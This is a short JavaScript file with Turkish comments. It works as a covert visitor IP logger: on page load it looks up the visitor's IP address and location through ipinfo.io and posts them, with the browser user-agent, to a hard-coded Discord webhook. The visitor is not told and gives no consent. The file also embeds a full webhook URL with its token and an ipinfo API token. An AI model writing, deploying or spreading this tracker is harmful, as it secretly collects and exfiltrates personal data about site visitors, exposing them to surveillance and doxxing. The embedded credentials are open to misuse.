        async function sendDiscordMessage(message) {
  const webhookUrl = 'https://discord.com/api/webhooks/1375534402389413888/wfcYejfEJTgGFMR1hcxjfKwwMwn-hPriJ6Crmk0O6h_OrpXvnL2HMHAzNhy74HqrUhoW';

  const payload = {
    content: message
  };

  try {
    const res = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (!res.ok) {
      throw new Error(`Discord API error: ${res.status}`);
    }
    console.log('Discord mesajı gönderildi!');
  } catch (err) {
    console.error('Discord mesaj gönderme hatası:', err);
  }
}

// Sayfa yüklendiğinde ziyaretçi bilgisi gönder
window.addEventListener('load', async () => {
  try {
    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3'); // Token isteğe bağlı ama sınır yükseltir
    if (!res.ok) throw new Error('IP info API error');
    const visitor = await res.json();

    const deviceInfo = navigator.userAgent;

    const message = `
IP: ${visitor.ip}
Şehir: ${visitor.city || 'Bilinmiyor'}
Bölge: ${visitor.region || 'Bilinmiyor'}
Ülke: ${visitor.country || 'Bilinmiyor'}
Cihaz: ${deviceInfo.substring(0, 100)}
    `;

    sendDiscordMessage(message);
  } catch (e) {
    console.error(e);
  }
});